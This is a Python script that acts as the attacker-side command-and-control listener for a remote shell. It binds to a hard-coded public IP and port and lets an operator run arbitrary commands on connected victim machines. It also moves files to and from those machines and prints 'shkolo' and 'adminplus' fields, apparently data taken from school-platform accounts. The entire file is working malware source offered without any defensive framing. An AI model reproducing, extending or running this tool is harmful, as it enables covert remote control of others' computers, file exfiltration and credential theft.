#!/usr/bin/python3.9
from socket import *
import json
import os
import base64
sock = socket(AF_INET, SOCK_STREAM)
sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
sock.bind(('93.127.131.115', 87))
sock.listen(5)
print('Listening on 93.127.131.115:87...')

def sendJ(data, client_socket):
    """Send JSON-encoded data to the client."""
    try:
        client_socket.send(json.dumps(data).encode('utf-8'))
    except UnicodeDecodeError:
        client_socket.send(json.dumps(data).encode('latin-1'))

def recvJ(client_socket):
    """Receive JSON-encoded data from the client."""
    data = b""
    while True:
        try:
            chunk = client_socket.recv(1024)
            if not chunk:
                break
            data += chunk
            return json.loads(data.decode('utf-8'))
        except (ValueError,json.JSONDecodeError):
            continue

try:
    while True:
        client_socket, client_address = sock.accept()
        print(f'Connected to {client_address}')

        try:
            while True:
                command = input(f"* Shell#~{client_address}: ")

                sendJ({"command": command}, client_socket)

                if command == "q":
                    print("Closing connection...")
                    break

                if command.startswith("cd "):
                    result_data = recvJ(client_socket)
                    if result_data:
                        status = result_data.get("status", "")
                        if status == "success":
                            print(result_data.get("result", ""))
                        elif status == "error":
                            print(f"Error: {result_data.get('message', 'Unknown error')}")
                    continue
                if command[:8] == 'download':
                    with open(command[9:],'wb') as file:
                              result = recvJ(client_socket)
                              if result["status"] == 'success':
                                file.write(base64.b64decode(result['result']))
                                print(f'File {command[9:]} has been downloaded successfully')
                                sendJ({"status" : "success","result" : " "},client_socket)
                              else:
                                sendJ({"status" : "error", "result" : " "},client_socket)
                if command[:6] == 'upload':
                  file_path = command[7:].strip()
                  if os.path.exists(file_path):
                    with open(file_path,'rb') as file:
                      try:
                         encoded_data = base64.b64encode(file.read()).decode('utf-8')
                         sendJ({"status" : "success","result" : encoded_data},client_socket)
                         print(f'File {command[7:]} has been uploaded successfully')
                      except Exception as e:
                          message = f'Error uploading file {e}'
                          print(f'Error uploading file {e}')
                          sendJ({"status" : "error", "message" : message},client_socket)
                  else:
                         message = 'No such file'
                         sendJ({"status" : "error", "message" : message},client_socket)
                if command == 'platform':
                    result = recvJ(client_socket)
                    print(result['shkolo'],result['adminplus'],sep='\n')
                    continue

                result_data = recvJ(client_socket)
                if result_data:
                    status = result_data.get("status", "")
                    if status == "success":
                        print(result_data.get("result", ""))
                    elif status == "error":
                        print(f"Error: {result_data.get('message', 'Unknown error')}")

        except ConnectionResetError:
            print(f"Client {client_address} disconnected unexpectedly.")
        except Exception as e:
            print(f"Error: {e}")
        finally:
            client_socket.close()
            print(f"Connection to {client_address} closed.")

except KeyboardInterrupt:
    print("\nServer shutting down...")
finally:
    sock.close()
    print("Server closed.")
